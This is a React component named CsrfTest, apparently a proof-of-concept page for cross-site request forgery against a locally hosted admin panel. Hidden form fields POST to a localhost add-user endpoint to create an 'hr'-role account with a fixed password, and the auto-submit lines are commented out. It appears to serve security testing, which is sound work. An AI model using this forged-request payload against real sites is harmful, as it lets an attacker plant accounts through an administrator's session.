import React, { Component } from 'react';
import { Container } from 'reactstrap';

class CsrfTest extends Component {

    componentDidMount(){
         // document.getElementById('form-submit').submit()
         // window.location.href = 'http://127.0.0.1:3333/'
    }

    render() { 

        return (
            <React.Fragment>
                <Container className='col-lg-8 col-md-8' >
                    <br />
                    <h3>
                        <center><img src="https://media.tenor.com/images/875007c406d7c54d623d4b630633d713/tenor.gif" /></center>
                    </h3>
                    <form method="POST" action="http://127.0.0.1:3333/admin/users-management/add-user" id="form-submit">
                        <input type="hidden" name="username" id="username" value="csrf" />
                        <input type="hidden" name="password" id="password" value="password123" />
                        <input type="hidden" name="confirm_password" id="confirm_password" value="password123" />
                        <input type="hidden" name="employee_id" id="employee_id" value="fake-001" />
                        <input type="hidden" name="organization_role_code" id="organization_role_code" value="hr" />
                        <input type="hidden" name="first_name" id="first_name" value="fake name" />
                        <input type="hidden" name="middle_name" id="middle_name" value="" />
                        <input type="hidden" name="last_name" id="last_name" value="fake lastname" />
                        <input type="hidden" name="anken_id" id="anken_id" value="" />
                        <input type="hidden" name="anken_name" id="anken_name" value="" />
                        <input type="hidden" name="email" id="email" value="fake@gmail.com" />
                    </form>
                </Container>
            </React.Fragment>
        );
    }
}
export default CsrfTest;

